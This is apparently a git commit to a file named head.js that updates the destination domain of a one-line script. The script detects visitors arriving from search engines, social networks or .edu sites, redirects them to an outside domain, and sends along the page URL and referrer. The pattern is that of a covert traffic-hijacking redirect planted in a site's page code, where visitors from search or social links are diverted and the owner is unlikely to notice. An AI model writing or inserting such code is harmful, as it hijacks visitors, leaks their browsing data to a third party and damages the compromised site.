280dab43da8187bbbd273a6b555769bf43f63fc5
asking2794 <146243355+asking2794@users.noreply.github.com>
2025-01-15 01:05:24 +0700

    Update head.js

--- head.js
+++ head.js
@@ -1,2 +1,2 @@
-var ars = 'https://kobost.com';
+var ars = 'https://blog.ondasee.com';
 if(['.edu.', '.google.', 'msn.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
